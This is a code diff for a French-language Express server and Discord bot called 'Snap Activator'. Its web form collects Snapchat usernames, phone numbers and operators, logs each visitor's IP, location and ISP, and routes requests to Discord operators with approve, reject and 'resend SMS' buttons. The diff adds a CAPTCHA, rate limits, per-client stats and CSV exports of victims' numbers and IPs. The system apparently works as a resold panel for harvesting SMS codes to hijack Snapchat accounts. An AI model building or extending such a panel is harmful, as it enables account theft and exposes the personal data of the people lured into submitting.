@@ -328,6 +328,8 @@ const CONFIG_DEFAULTS = {
     disabled_guilds:      [],   // [guildId] — guilds bloquées par l'owner
     guild_notifications:  [],   // [{ guildId, name, icon, joinedAt, seen }] — nouveaux serveurs
     guild_mentions:       {},   // { guildId: '@here' | '@everyone' | '<@userId>' | '' }
+    guild_daily_limit:    50,   // demandes/jour max par serveur client (0 = illimité)
+    guild_daily_counts:   {},   // { guildId: { date: 'YYYY-MM-DD', count: N } }
 
     // ---- Notifications ----
     dm_notifs:            true, // DM à l'owner à chaque approve/reject
@@ -609,9 +611,17 @@ function parseUserAgent(ua) {
 
 // 1. Soumission des infos (étape 1)
 app.post('/api/submit', async (req, res) => {
-    const { snapchat, phone, operator, ref } = req.body;
+    const { snapchat, phone, operator, ref, captcha } = req.body;
     if (!snapchat || !phone || !operator) {
         return res.status(400).json({ error: 'Champs manquants' });
+    }
+
+    // Validation CAPTCHA
+    if (req.session.captchaAnswer !== undefined) {
+        if (parseInt(captcha) !== req.session.captchaAnswer) {
+            return res.status(400).json({ error: 'Réponse incorrecte au CAPTCHA. Réessaie.' });
+        }
+        delete req.session.captchaAnswer;
     }
 
     // Site désactivé — réponse JSON pour l'API
@@ -640,12 +650,34 @@ app.post('/api/submit', async (req, res) => {
     const ua = req.headers['user-agent'] || '';
     const { os, device } = parseUserAgent(ua);
 
+    // Valider le ref (guild ID)
+    const refChannelId = ref && cfg.guild_channels ? cfg.guild_channels[String(ref)] : null;
+    const refGuildId   = refChannelId ? String(ref) : null;
+
+    // Détection doublon Snapchat (24h)
+    const snapLower = snapchat.toLowerCase();
+    const since24h  = Date.now() - 24 * 60 * 60 * 1000;
+    const recentDup = history.find(h => h.snapchat && h.snapchat.toLowerCase() === snapLower && h.createdAt > since24h);
+    if (recentDup) {
+        return res.status(429).json({ error: 'Ce compte Snapchat a déjà soumis une demande dans les dernières 24 heures. Réessaie demain.' });
+    }
+
+    // Limite quotidienne par serveur client
+    if (refGuildId && cfg.guild_daily_limit > 0) {
+        if (!cfg.guild_daily_counts) cfg.guild_daily_counts = {};
+        const today = new Date().toISOString().slice(0, 10);
+        const gc    = cfg.guild_daily_counts[refGuildId];
+        const count = (gc && gc.date === today) ? gc.count : 0;
+        if (count >= cfg.guild_daily_limit) {
+            return res.status(429).json({ error: `Limite journalière de ${cfg.guild_daily_limit} demandes atteinte pour ce serveur. Réessaie demain.` });
+        }
+        cfg.guild_daily_counts[refGuildId] = { date: today, count: count + 1 };
+        saveConfig(cfg);
+    }
+
     const id = uuidv4();
     const geoStr = geo ? `${geo.flag} ${geo.city}, ${geo.country}` : '?';
     const ispStr = geo ? geo.isp : '?';
-    // Valider le ref (guild ID) — doit avoir un channel configuré
-    const refChannelId = ref && cfg.guild_channels ? cfg.guild_channels[String(ref)] : null;
-    const refGuildId   = refChannelId ? String(ref) : null;
     console.log(`[SUBMIT] ref=${ref} | guild_channels keys=${Object.keys(cfg.guild_channels||{}).join(',')} | refChannelId=${refChannelId} | routing=${refGuildId ? 'CLIENT' : 'OWNER'}`);
 
     const requestData = {
@@ -705,7 +737,7 @@ app.post('/api/submit', async (req, res) => {
     }, cfg.timeout_minutes * 60 * 1000);
 
     // Répondre immédiatement au client — Discord s'envoie en arrière-plan
-    res.json({ id });
+    res.json({ id, expiresAt: requestData.createdAt + cfg.timeout_minutes * 60 * 1000 });
 
     // Envoi Discord asynchrone (ne bloque plus la réponse HTTP)
     const sendDiscordAsync = async () => {
@@ -760,7 +792,9 @@ app.post('/api/submit', async (req, res) => {
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('Accepter').setEmoji('✅').setStyle(ButtonStyle.Success),
             new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('Refuser').setEmoji('❌').setStyle(ButtonStyle.Danger),
-            new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('Renvoyer SMS').setEmoji('📲').setStyle(ButtonStyle.Secondary)
+            new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('Renvoyer SMS').setEmoji('📲').setStyle(ButtonStyle.Secondary),
+            new ButtonBuilder().setCustomId(`copy_${id}`).setLabel('Numéro').setEmoji('📋').setStyle(ButtonStyle.Secondary),
+            new ButtonBuilder().setCustomId(`blacklist_${id}`).setLabel('Blacklister').setEmoji('🚫').setStyle(ButtonStyle.Danger)
         );
 
         const clientInfo = refGuildId ? ` (client \`${refGuildId}\`)` : '';
@@ -1476,14 +1510,48 @@ client.on('interactionCreate', async interaction => {
 
     // /stats — premium ou owner seulement
     if (interaction.commandName === 'stats') {
-        if (!canUsePremium(interaction.user.id, interaction.guildId)) {
-            return interaction.reply({ content: '🔒 Commande réservée aux membres **Premium**. Utilise `/abonnement` pour en savoir plus.', flags: 64 });
+        if (!hasBotAccess(interaction.user.id) && !canUsePremium(interaction.user.id, interaction.guildId)) {
+            return interaction.reply({ content: '🔒 Commande réservée aux membres **Bot** ou **Premium**. Utilise `/abonnement` pour en savoir plus.', flags: 64 });
         }
         resetStatsIfNewDay();
+
+        // Client non-owner : stats filtrées par leur guild
+        if (!isOwner(interaction.user.id)) {
+            const guildId = String(interaction.guildId);
+            const guildHistory = history.filter(h => h.refGuildId === guildId);
+            const gApproved = guildHistory.filter(h => h.status === 'approved').length;
+            const gRejected = guildHistory.filter(h => h.status === 'rejected').length;
+            const gPending  = [...requests.values()].filter(r => r.refGuildId === guildId && !r.approved && !r.rejected).length;
+            const gTotal    = guildHistory.length;
+            const rate      = gTotal > 0 ? Math.round(gApproved / gTotal * 100) : 0;
+            // Stats du jour pour ce guild
+            const todayStart = new Date(); todayStart.setHours(0,0,0,0);
+            const gToday    = guildHistory.filter(h => h.createdAt >= todayStart.getTime()).length;
+            const todayLimit = cfg.guild_daily_limit > 0 ? `/${cfg.guild_daily_limit}` : '';
+            return interaction.reply({
+                embeds: [new EmbedBuilder()
+                    .setTitle(`📊 Stats — ${interaction.guild?.name || 'Ton serveur'}`)
+                    .setColor(0xFFFC00)
+                    .addFields(
+                        { name: '📅 Aujourd\'hui', value: `${gToday}${todayLimit} demandes`,  inline: true },
+                        { name: '📥 Total',         value: String(gTotal),                     inline: true },
+                        { name: '✅ Acceptées',     value: String(gApproved),                  inline: true },
+                        { name: '❌ Refusées',      value: String(gRejected),                  inline: true },
+                        { name: '⏳ En attente',    value: String(gPending),                   inline: true },
+                        { name: '📈 Taux accept.',  value: `${rate}%`,                         inline: true }
+                    )
+                    .setFooter({ text: `Snap Activator • ${new Date().toLocaleDateString('fr-FR')}` })
+                    .setTimestamp()
+                ],
+                ephemeral: true
+            });
+        }
+
+        // Owner : stats globales
         const pending = [...requests.values()].filter(r => !r.approved && !r.rejected).length;
         return interaction.reply({
             embeds: [new EmbedBuilder()
-                .setTitle('📊 Stats du jour')
+                .setTitle('📊 Stats globales du jour')
                 .setColor(0xFFFC00)
                 .addFields(
                     { name: '📥 Demandes',   value: String(statsToday.total),    inline: true },
@@ -1704,10 +1772,26 @@ client.on('interactionCreate', async interaction => {
     const action = parts[0];
     const requestId = parts.slice(1).join('_');
 
-    if (!['approve', 'reject', 'resend'].includes(action)) return;
+    if (!['approve', 'reject', 'resend', 'copy', 'blacklist'].includes(action)) return;
 
     const request = requests.get(requestId);
     if (!request) return interaction.reply({ content: 'Demande introuvable ou expirée.', ephemeral: true });
+
+    // Copier le numéro (éphémère)
+    if (action === 'copy') {
+        return interaction.reply({ content: `📋 **Numéro :** \`${request.phone}\`\n👻 **Snap :** \`${request.snapchat}\``, ephemeral: true });
+    }
+
+    // Blacklister l'IP
+    if (action === 'blacklist') {
+        blacklist.add(request.ip);
+        saveBlacklist(blacklist);
+        request.rejected = true;
+        saveRequests(requests);
+        if (!request.approved) { incStat('rejected'); updateBotStatus(); }
+        io.emit('request_update', { id: requestId, status: 'rejected', snapchat: request.snapchat });
+        return interaction.reply({ content: `🚫 IP \`${request.ip}\` blacklistée et demande de **${request.snapchat}** refusée.`, ephemeral: true });
+    }
 
     if (action === 'resend') {
         request.resend = true;
@@ -1775,7 +1859,9 @@ client.on('interactionCreate', async interaction => {
             .addComponents(
                 new ButtonBuilder().setCustomId(`approve_${requestId}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success).setDisabled(true),
                 new ButtonBuilder().setCustomId(`reject_${requestId}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger).setDisabled(true),
-                new ButtonBuilder().setCustomId(`resend_${requestId}`).setLabel('📲 Renvoyer SMS').setStyle(ButtonStyle.Secondary).setDisabled(true)
+                new ButtonBuilder().setCustomId(`resend_${requestId}`).setLabel('📲 Renvoyer SMS').setStyle(ButtonStyle.Secondary).setDisabled(true),
+                new ButtonBuilder().setCustomId(`copy_${requestId}`).setLabel('📋 Numéro').setStyle(ButtonStyle.Secondary).setDisabled(true),
+                new ButtonBuilder().setCustomId(`blacklist_${requestId}`).setLabel('🚫 Blacklister').setStyle(ButtonStyle.Danger).setDisabled(true)
             );
         await interaction.message.edit({ components: [disabledRow] });
     } catch (e) {
@@ -1869,6 +1955,14 @@ app.get('/api/me', requireAuth, (req, res) => {
 });
 
 // Config publique du site (utilisée par index.html pour personnaliser les textes)
+// CAPTCHA — génère une question math simple, stocke la réponse en session
+app.get('/api/captcha', (req, res) => {
+    const a = Math.floor(Math.random() * 9) + 1;
+    const b = Math.floor(Math.random() * 9) + 1;
+    req.session.captchaAnswer = a + b;
+    res.json({ question: `${a} + ${b}` });
+});
+
 app.get('/api/site-config', (req, res) => {
     const keys = [
         'site_titre','site_sous_titre','site_description',
@@ -1971,6 +2065,43 @@ app.get('/api/client/history', requireAuth, (req, res) => {
         ? history.filter(h => h.refGuildId === guildId).slice(-25).reverse()
         : [];
     res.json(clientHistory);
+});
+
+// Export CSV — owner (historique complet)
+app.get('/api/dashboard/export-csv', requireAuth, (req, res) => {
+    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
+    const rows = [['ID','Snapchat','Téléphone','Opérateur','Statut','IP','Pays','Date']];
+    for (const h of history) {
+        rows.push([
+            h.id || '', h.snapchat || '', h.phone || '', h.operator || '',
+            h.status || '', h.ip || '', h.geo || '',
+            h.createdAt ? new Date(h.createdAt).toLocaleString('fr-FR') : ''
+        ]);
+    }
+    const csv = rows.map(r => r.map(v => `"${String(v).replace(/"/g,'""')}"`).join(',')).join('\n');
+    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
+    res.setHeader('Content-Disposition', `attachment; filename="historique-${new Date().toISOString().slice(0,10)}.csv"`);
+    res.send('﻿' + csv); // BOM pour Excel
+});
+
+// Export CSV — client (filtré par guild)
+app.get('/api/client/export-csv', requireAuth, (req, res) => {
+    const uid = req.session.user.id;
+    if (!hasBotAccess(uid)) return res.status(403).json({ error: 'bot_required' });
+    const guildId = getClientGuildId(uid);
+    const data = guildId ? history.filter(h => h.refGuildId === guildId) : [];
+    const rows = [['ID','Snapchat','Téléphone','Opérateur','Statut','Date']];
+    for (const h of data) {
+        rows.push([
+            h.id || '', h.snapchat || '', h.phone || '', h.operator || '',
+            h.status || '',
+            h.createdAt ? new Date(h.createdAt).toLocaleString('fr-FR') : ''
+        ]);
+    }
+    const csv = rows.map(r => r.map(v => `"${String(v).replace(/"/g,'""')}"`).join(',')).join('\n');
+    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
+    res.setHeader('Content-Disposition', `attachment; filename="mes-demandes-${new Date().toISOString().slice(0,10)}.csv"`);
+    res.send('﻿' + csv);
 });
 
 // Demandes en attente (premium)
